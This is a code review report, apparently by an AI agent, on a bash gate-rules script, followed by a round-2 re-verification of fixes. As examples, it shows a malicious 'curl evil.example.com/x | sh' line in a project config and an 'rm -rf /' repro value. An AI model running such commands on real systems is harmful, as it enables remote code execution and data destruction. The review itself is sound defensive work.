---
skill: code-reviewer
version: 1.2.1
produced_at: 2026-04-28T00:00:00Z
produced_by: claude-opus-4-7
project: InsanelyGreat's SSD Skills Library
scope: ssd-skill-upgrades / iteration 1 (working-tree diff vs main)
consumed_by: [ssd]
finding_counts:
  blocker: 0
  major: 0       # round 1: 2 MAJOR — both closed in round 2 (see § Round 2 below)
  minor: 1       # round 1: 3 MINOR — 2 closed in round 2, 1 (CHANGELOG link) routed to notes
  question: 2    # routed to .ssd/current.notes.yml NOTES-2, NOTES-3
  suggestion: 1  # routed to .ssd/current.notes.yml NOTES-4
  nit: 0
gate_pass: true   # after round 2 fixes
remediation_mode: false
round: 2          # informal multi-round (formalized in iteration 3 / P1.2)
closed_from_previous_round: [MAJOR-1, MAJOR-2, MINOR-1, MINOR-2]
---

# Code Review — Iteration 1 (P1.6 + P1.7)

## Summary

Two MAJOR findings — both in `methodology/gate-rules.sh`, both involving the rules silently
producing the wrong result. The ADRs and the SKILL.md edits are clean. The v1→v2 migration UX
documented in `ssd-init/SKILL.md` Step 7 is well-thought-through. The forward-compat fields
(`iteration`, `gate_rounds`, `rail_deviations`) are correctly placed in the v2 schema with sensible
defaults.

`gate_pass: false` because the MAJOR findings reside in the gate-enforcement tool itself: a
silent-FAIL gate is worse than no gate. Both findings are 5-to-10-line fixes; iteration 1 should
loop back to coder before merge.

## Phase 1 — Context (read before review)

- [01-architect.md](01-architect.md) — epic-level scope and the 9-iteration sequence.
- [03-coder-status.md](03-coder-status.md) — what was built, known limitations, declared `spec_drift: false`.
- The diff: 18 files, ~590 lines insertions, ~161 deletions.

I confirm `spec_drift: false` against the architect doc:
- v2 schema fields match the architect doc § "Data Model".
- Four rules in the script match the architect doc § "Per-iteration scope and exit criteria / Iteration 1".
- ADR numbering matches the pre-numbered table.
- `.bak` guard matches the architect's back-compat requirement.

Phase 1.5 (Prior-Review Follow-up) is not applicable — this is new work, not a remediation branch.
`remediation_mode: false` in frontmatter.

---

## 🟠 MAJOR-1: `feature-flag-present` greps file contents, not the diff — silent false PASS

[methodology/gate-rules.sh:140](methodology/gate-rules.sh#L140)

```bash
if grep -rE "$marker" $(echo "$non_doc" | tr '\n' ' ') 2>/dev/null | head -1 >/dev/null; then
  emit "PASS" "feature-flag-present" "marker \`$marker\` found in changed code"
```

`grep -rE "$marker" <files>` searches the **current contents** of each changed file, not the diff
introduced by the PR. Concrete failure mode:

1. File `payments.py` exists on `main` and contains `if flag_enabled("legacy_payments"):` from a
   prior commit.
2. PR adds a new function `def new_unrelated_endpoint():` in `payments.py` with no flag.
3. `gate-rules.sh` greps `payments.py`, finds the existing marker, emits **PASS**.
4. The new endpoint ships unflagged. The gate's most consequential rule has been bypassed silently.

The PASS message even says "marker found in changed code" — but what was checked is "marker found
in a file that had any change," which is a strictly weaker claim.

This is the doctrine rule the SSD methodology prizes most highly (core.md §3 — feature flags for
new code). A gate that gives a false PASS here defeats the architect doc's claim that "the gate is
real, not aspirational" (ADR-0005 § Consequences).

**Fix**: grep the added lines of the diff, not the file contents:

```bash
# files only — for the SKIP-when-doc-only check above this stays the same
# but the actual marker check should examine the patch:
if git -C "$PROJECT_ROOT" diff "$BASE...HEAD" -- $(printf '%s\n' $non_doc) \
   | grep -E "^\+[^+].*$marker" -q; then
  emit "PASS" "feature-flag-present" "marker \`$marker\` present in added lines"
else
  emit "FAIL" "feature-flag-present" "marker \`$marker\` not present in added code lines"
fi
```

Note: the substitution still has the word-splitting issue covered in MAJOR-2 — fix both together.

---

## 🟠 MAJOR-2: Unquoted command substitution causes silent SKIP/FAIL on paths with spaces or shell metacharacters

[methodology/gate-rules.sh:140](methodology/gate-rules.sh#L140) and
[methodology/gate-rules.sh:161](methodology/gate-rules.sh#L161)

```bash
# line 140 (feature-flag-present)
grep -rE "$marker" $(echo "$non_doc" | tr '\n' ' ') 2>/dev/null | head -1 >/dev/null

# line 161 (adr-delta)
arch_lines=$(git -C "$PROJECT_ROOT" diff --numstat "$BASE...HEAD" -- $(echo "$arch_files" | tr '\n' ' ') 2>/dev/null \
  | awk '{a+=$1; b+=$2} END {print a+b+0}')
```

Both lines convert a newline-separated list of filenames to a space-separated string and pass it
**unquoted** as arguments. Two failure modes:

1. **Filenames with spaces** (e.g., `My Documents/foo.py`) get split into multiple arguments.
   `grep` and `git diff` look for files that don't exist; both error to stderr (swallowed by
   `2>/dev/null`); both return empty stdout.
   - For `feature-flag-present` (MAJOR-1): emits FAIL ("marker not found"). Misleading message
     but at least fails closed.
   - For `adr-delta`: `arch_lines = 0`, falls below threshold, **emits SKIP**. The gate silently
     bypasses ADR enforcement on a real architectural change.
2. **Filenames with shell metacharacters** (`*`, `?`, `[`) undergo pathname expansion. A file named
   `[archived]/note.py` (or paths under directories with brackets) becomes a glob pattern that may
   match unrelated files, or no files. Same silent-skip outcome.

This is a doctrine violation: SSD's core principle is "fail loud at boundaries." A SKIP that hides a
real architectural change is exactly the wrong default.

**Note on this iteration's diff**: no problematic filenames exist in the current diff
(`architect/.DS_Store` and the ADR files are well-formed). The bug is real but doesn't bite *this*
iteration. It will bite consumer projects (athena likely escapes; future projects may not).

**Fix**: use null-delimited iteration or `xargs -0`:

```bash
# Iterate safely
local IFS=$'\n'  # or read into an array
local files_array=()
while IFS= read -r f; do files_array+=("$f"); done <<< "$non_doc"
grep -rE "$marker" "${files_array[@]}" 2>/dev/null | head -1 >/dev/null
```

Or feed git/grep through stdin with NUL delimiters:

```bash
arch_lines=$(printf '%s\n' "$arch_files" \
  | git -C "$PROJECT_ROOT" diff --numstat "$BASE...HEAD" -- $(cat) ... )
```

(actually no — keep it simple with the array form). The architect-doc ADR-0005 § Consequences
already names "POSIX-compliant where possible" — this fix lives within that constraint.

---

## 🟡 MINOR-1: `yaml_get` matches keys inside comments

[methodology/gate-rules.sh:60-67](methodology/gate-rules.sh#L60)

```bash
yaml_get() {
  awk -v k="$key" '
    $0 ~ "^[[:space:]]*"k":" {
      sub(/^[[:space:]]*[^:]+:[[:space:]]*/, "")
      ...
    }
  ' "$file"
}
```

The pattern `^[[:space:]]*<key>:` matches a commented line like `# test_command: pytest` because
the `#` is leading whitespace as far as the awk regex character class doesn't reject. Specifically,
the leading whitespace pattern `[[:space:]]*` doesn't span over `#`, so `# test_command:` fails to
match — but `  # test_command:` (with leading spaces) doesn't match either because `#` is not in
`[[:space:]]`. So actually this is OK for indented comments. **However**, `# test_command: pytest`
at column 0 fails the `^[[:space:]]*` part... wait, `[[:space:]]*` matches zero or more spaces, so
zero spaces is fine, but then `[^:]+:` needs to match `# test_command:` which it does (the `#` is
in `[^:]+`).

So a commented line at column 0 like `# test_command: example_value` IS matched, and the value
returned is `example_value`. A user with a documentation-style commented example would see their
gate run an example command.

**Repro**:
```bash
echo "# test_command: rm -rf /" > /tmp/p.yml
# (with my yaml_get function) -> "rm -rf /"
```

**Severity**: MINOR — likelihood is low (most commented YAML uses indentation or `#:` with no
space), but the consequence stacks with QUESTION-1 (eval).

**Fix**: anchor against `^[[:space:]]*[^#]` or skip lines starting with `#` explicitly:

```bash
$0 !~ /^[[:space:]]*#/ && $0 ~ "^[[:space:]]*"k":" { ... }
```

---

## 🟡 MINOR-2: `--base` argument parser accepts adjacent flags as values

[methodology/gate-rules.sh:32](methodology/gate-rules.sh#L32)

```bash
case "$1" in
  --base) BASE="$2"; shift 2 ;;
```

`bash gate-rules.sh --base --json` sets `BASE="--json"` and silently runs against a base that
doesn't exist. `git log "--json..HEAD"` errors, swallowed by `2>/dev/null`, the rule emits PASS
("no WIP commits" — because there are no commits in an invalid range) — yet another false PASS
case for `wip-commits`.

**Fix**: validate that the next arg doesn't start with `--`:

```bash
--base)
  if [[ -z "${2:-}" || "${2:-}" == --* ]]; then
    echo "--base requires a value" >&2; exit 2
  fi
  BASE="$2"; shift 2 ;;
```

Or skip the explicit check and verify later that BASE resolves to a real ref via
`git rev-parse --verify "$BASE^{}"`.

---

## 🟡 MINOR-3: CHANGELOG markdown link target is gitignored

[CHANGELOG.md:13](CHANGELOG.md#L13)

```markdown
First substantive iteration of the multi-iteration plan documented at
[.ssd/features/ssd-skill-upgrades/01-architect.md](.ssd/features/ssd-skill-upgrades/01-architect.md). Bundled
```

The CHANGELOG is committed; the link target lives under `.ssd/` which is gitignored. When users
read the CHANGELOG on GitHub, the link resolves to a 404. This isn't unique to iteration 1 —
existing CHANGELOG entries also reference `.ssd/` — but the new entry adds another such link.

Two reasonable resolutions:

1. **Accept**: document in README that `.ssd/` references in CHANGELOG are "for the maintainer's
   working copy; not browseable on GitHub." Cheapest.
2. **Move milestone summaries to a committed location**: e.g., `docs/architecture/milestone-<n>.md`
   gets a copy of the architect doc that the CHANGELOG can link to. Higher overhead per iteration.

Defer the decision; not a merge-blocker. Note in the iteration's notes file
([.ssd/current.notes.yml](.ssd/current.notes.yml) → `questions_for_next_session`) for the team to
resolve.

---

## 💭 QUESTION-1: `eval` of project-controlled `test_command` — what's the trust model?

[methodology/gate-rules.sh:108](methodology/gate-rules.sh#L108)

```bash
out=$(cd "$PROJECT_ROOT" && eval "$cmd" 2>&1)
```

`cmd` is read verbatim from `.ssd/project.yml` and `eval`'d. This is a code-execution surface:

- **Within scope** (project owner trusts their own config): a project owner committing
  `test_command: pytest` runs pytest on their gate. Reasonable.
- **Out of scope** (supply-chain): a malicious PR modifies `.ssd/project.yml` to
  `test_command: pytest && curl evil.example.com/x | sh`, ships a green test suite, gets the PR
  merged. The next collaborator's `/ssd gate` invocation runs the embedded command. Every CI
  system has an analog of this risk; the question is whether SSD wants to inherit it implicitly
  or address it explicitly.

Three resolutions:

1. **Document and accept** the trust model. Add a comment block above the `eval` line stating
   "`.ssd/project.yml` is project-trusted source; PRs that modify it are subject to the standard
   review gate which is itself protected by this rule, etc." Acknowledges the loop.
2. **Constrain the command syntax**: e.g., `test_command` must be a single executable name
   followed by argv (no `&&`, `;`, `|`, backticks). Then run it without `eval`. Restrictive but
   defensible.
3. **Run `test_command` in a sandbox** (Docker, `bwrap`, `nsjail`). High overhead.

**My read**: option 1 (document & accept) for v1.5.0; option 2 if the threat model evolves. But
this is a real architectural decision that the architect doc punted on. Worth surfacing
explicitly. **Not blocking merge** — eval-of-trusted-config is the status quo for most CI tooling.

---

## 💭 QUESTION-2: `adr-delta` threshold of 200 is hard-coded

[methodology/gate-rules.sh:164](methodology/gate-rules.sh#L164)

```bash
local threshold=200
```

The architect doc's intent is "non-trivial architectural change → expect an ADR." 200 lines of
diff outside test/migration/docs scope is one (defensible) threshold. But:

- A 199-line architectural change without an ADR slides through silently.
- A 201-line refactor of well-isolated implementation code with no architectural meaning fails
  the gate spuriously.

Should the threshold be configurable from `project.yml` (e.g., `adr_delta_threshold: 200`)? Or
should the rule split into "warn at 100, fail at 500" tiers? Defer to the project owner's
judgment, but the current value is opinionated and undocumented.

**Suggested resolution**: leave at 200 for v1.5.0 (matches the architect doc) but add a TODO
comment naming this as a future-iteration tunable.

---

## 💡 SUGGESTION-1: Add `set -e` inside individual rule functions

[methodology/gate-rules.sh:23](methodology/gate-rules.sh#L23)

The script-level `set -uo pipefail` (no `-e`) is correct: we want all rules to run even if one
fails. But within a single rule, an unexpected command failure (e.g., `git log` hitting a
permission error, `wc -l` choking on a binary file) currently silently produces wrong data.

Consider wrapping each rule body in a subshell with `set -e`:

```bash
rule_wip_commits() {
  ( set -e
    if ! is_git_repo; then emit "SKIP" ...; exit 0; fi
    matches=$(git -C "$PROJECT_ROOT" log "$BASE..HEAD" ...)
    ...
  ) || emit "FAIL" "wip-commits" "rule errored — check stderr"
}
```

Each rule fails loud on its own implementation bugs without taking the others down. **Defer to a
future iteration** — out of scope for iteration 1.

---

## What's good (worth saying explicitly)

- The two ADRs follow the template exactly. Context, decision, rationale, consequences, alternatives
  rejected — all present, all substantive. The "Future Compatibility" appendix in ADR-0005 (stdout
  format is the contract; reimplementation in another language is drop-in) shows long-horizon
  thinking.
- The forward-compat schema choice in v2 (`iteration: null`, `gate_rounds: 0`,
  `rail_deviations: []` as defaults) is exactly right. Athena's eventual migration is a single
  hop, not a sequence.
- `ssd-init` Step 7's three-option migration prompt (`yes / skip-this-session / show-diff`) and
  the `.bak`-already-exists guard are well-scoped.
- The script's `--json` output is a real interface, not theater. The text mode is for humans, JSON
  for CI/jq, both rendered from the same `RESULTS` array. Clean.
- Dogfooding the migration on this repo's own `current.yml` — with `.bak` left in place — is the
  right way to discover the process before athena needs it.

## Phase 3.5 — Fix-Introduces-Edge-Cases

The bash script is itself defensive code (skips when preconditions absent). Walking the checklist:

| Check | Result |
|---|---|
| Null return from helper | `yaml_get` returns empty string. All callers guard with `[[ -z "$cmd" ]]` → SKIP. ✅ |
| Filter mismatched with constraint | N/A (no IntegrityError analog) |
| Cache invalidation race | N/A (no caching) |
| Retry idempotency | N/A (no retries) |
| Exception narrowing edge | bash has no exceptions; `set -uo pipefail` semantics covered in SUGGESTION-1 |
| Signal handler ordering | N/A |
| New configuration knob | `test_command` and `feature_flag_marker` are new optional knobs in `project.yml`. Default behavior (absence → SKIP) is sane. ✅ |

The `ssd-init` Step 7 migration is also defensive code:

| Check | Result |
|---|---|
| `.bak` exists race (TOCTTOU) | User could run init twice quickly; second run sees the first's `.bak` and refuses. Acceptable for one-shot interactive op. ✅ |
| Re-prompt on skip | Documented; legacy reader survives indefinitely. ✅ |
| Default for missing fields in v2 | Documented (`gate_rounds: 0`, `iteration: null`, etc.). ✅ |

No findings from the fix-edge-case sweep beyond what's already raised.

## Self-Verification

1. ✅ Read the actual files cited (gate-rules.sh, both ADRs, sampled the SKILL.md edits).
2. ✅ Traced both MAJOR claims through the execution path. The false-PASS in MAJOR-1 is reproducible
   in 30 seconds (file with existing flag + add unflagged code → PASS); the silent-SKIP in MAJOR-2
   reproduces with any path containing a space.
3. ✅ All citations point to real lines in the current files.
4. ⚠️ MAJOR-2's impact "for this iteration" is theoretical — flagged in the finding body. The bug
   is real for the gate's general use; severity remains MAJOR per the doctrine "fail loud at
   boundaries" cited in the script's own header.
5. ✅ No sub-agents used.
6. ✅ Downgraded threshold-question from MAJOR to QUESTION (no evidence the current threshold is
   wrong, just opinionated).
7. ✅ Phase 3.5 walked above.
8. N/A `remediation_mode: false`.

## Recommendation

**Return to coder.** Two MAJOR findings need to close before iteration 1 lands:

1. **MAJOR-1**: rewrite `feature-flag-present` to grep added diff lines, not file contents. ~10
   lines of bash.
2. **MAJOR-2**: replace the unquoted-substitution pattern in both `feature-flag-present` and
   `adr-delta` with an array-based or null-delimited iteration. ~5 lines per rule.

Both fixes are local to `gate-rules.sh`. No SKILL.md or ADR changes required.

After fix, re-run gate; `code-reviewer` should re-verify the two findings as closed (round-2 review
once iteration 3's multi-round-gate substrate exists; for iteration 1, an inline re-review is
acceptable). Iteration 1 then ships clean.

The MINORs and QUESTIONs are not merge-blockers; route them to
[.ssd/current.notes.yml](.ssd/current.notes.yml) `questions_for_next_session` for the team to
address as ergonomic improvements over iterations 2–9.

---

## Round 2 — re-verification

After [03-coder-status.md § Round 2](03-coder-status.md), I re-verified the four findings claimed
closed. This is an inline round-2 update because iteration 3 (P1.2 multi-round gates) hasn't built
the `code-review/round-N.md` substrate yet. Reading the fixes against the cited lines:

### MAJOR-1 — closed ✅

[methodology/gate-rules.sh:140-152 (post-fix)](methodology/gate-rules.sh#L140) now reads:

```bash
local diff_added
diff_added=$(git -C "$PROJECT_ROOT" diff "$BASE...HEAD" -- "${non_doc_array[@]}" 2>/dev/null \
  | grep -E "^\+[^+]" || true)
if [[ -z "$diff_added" ]]; then
  emit "SKIP" "feature-flag-present" "no added code lines in non-doc files"
  return
fi
if echo "$diff_added" | grep -qE "$marker"; then
  emit "PASS" "feature-flag-present" ...
else
  emit "FAIL" "feature-flag-present" ...
```

The grep target is now the diff's added lines (`^+[^+]` excludes `+++` headers), not file
contents. The synthetic test in 03-coder-status (file with existing `flag_enabled("legacy")` +
unflagged addition) reproduces the false-PASS scenario from MAJOR-1 and now correctly emits FAIL.
A new `SKIP "no added code lines in non-doc files"` path covers the boundary case where non-doc
files appear in the diff but only have deletions — sensible.

### MAJOR-2 — closed ✅

A new helper `read_lines_into_array` (post-fix file, ~lines 70-80) builds a quoted bash array from
newline-separated input, bash-3.2-compatible (no `mapfile`/`readarray`). Both rules now use it:

- `feature-flag-present` (line ~145): `read_lines_into_array non_doc_array <<< "$non_doc"` →
  `git diff ... -- "${non_doc_array[@]}"`.
- `adr-delta` (line ~165): `read_lines_into_array arch_files_array <<< "$arch_files"` →
  `git diff --numstat ... -- "${arch_files_array[@]}"`.

Synthetic test: spaced directory `src dir/mod.py` + 250 architectural lines without ADR →
`feature-flag-present` PASS, `adr-delta` FAIL with the correct line count. The unquoted
substitution → silent SKIP path is gone.

The helper itself uses `eval` on a controlled variable name (literal string "non_doc_array" or
"arch_files_array" passed by callers). Not user input. Internal-eval pattern is acceptable; common
in bash-3.2 array-passing idioms.

### MINOR-1 — closed ✅

`yaml_get` (post-fix) prepends an awk rule `$0 ~ /^[[:space:]]*#/ { next }` that skips comment
lines before the key match. Verified manually with a YAML containing both
`# test_command: rm -rf /` and `test_command: echo real_value` — returns the latter, exit 0.

### MINOR-2 — closed ✅

`--base` parser (post-fix lines 32-36):

```bash
--base)
  if [[ -z "${2:-}" || "${2:-}" == --* ]]; then
    echo "--base requires a value (got '${2:-<empty>}')" >&2; exit 2
  fi
  BASE="$2"; shift 2 ;;
```

Verified: `--base` (no value) → exit 2 with explanatory stderr; `--base --json` → exit 2 with
`got '--json'`. Adjacent flags no longer silently consumed as values.

### Self-Verification (round 2)

1. ✅ Re-read the actual modified lines of `gate-rules.sh`, not from memory.
2. ✅ Each MAJOR's "claim closed" verified by tracing the new execution path AND running the
   synthetic test that originally reproduced the bug.
3. ✅ Citations in this round-2 section reference the post-fix file; the round-1 findings above
   reference the pre-fix file as historical record.
4. ✅ No new BLOCKER/MAJOR introduced by the fix (Phase 3.5 walked over `read_lines_into_array`
   and the new diff-grep — no new edge cases).

### Round-2 outcome

`gate_pass: true`. Iteration 1 cleared. Frontmatter updated:
- `major: 0` (was 2)
- `minor: 1` (only MINOR-3 / CHANGELOG-link remains, routed to NOTES-1)
- `closed_from_previous_round: [MAJOR-1, MAJOR-2, MINOR-1, MINOR-2]`
- `round: 2` (informal; the field will be formal once iteration 3 lands P1.2)

Iteration 1 may merge. Open work:
- NOTES-1: CHANGELOG `.ssd/` link policy decision needed before iteration 2 ships its CHANGELOG entry.
- NOTES-2 through NOTES-5: deferred to later iterations as scheduled.
